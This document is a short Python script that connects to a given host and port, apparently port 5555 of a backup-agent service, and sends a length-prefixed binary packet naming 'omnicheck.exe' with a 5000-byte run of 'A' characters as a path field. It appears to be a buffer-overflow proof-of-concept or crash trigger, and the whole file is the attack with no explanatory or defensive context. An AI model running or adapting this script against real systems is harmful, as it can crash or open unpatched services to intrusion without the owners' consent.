import sys
import socket

from struct import pack

ip = sys.argv[1]
port = int(sys.argv[2]) # default tcp port 5555

target = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)

path = 'A' * 5000

packet =  pack('<L', 0x20003220)
packet += pack('<L', 0x00302000)
packet += '\x20'
packet += pack('>H', 0x0020)
packet += pack('<L', 0x00432000)
packet += pack('<L', 0x00303220)
packet += '\x20'
packet += 'omnicheck.exe'
packet += pack('>H', 0x0020)
packet += pack('>H', 0x0020) * 4
packet += pack('<L', 0x30200030)
packet += pack('>H', 0x0020)
packet += path
packet += pack('>H', 0x0000)

plen = pack('>L', len(packet))

s.send(plen + packet)
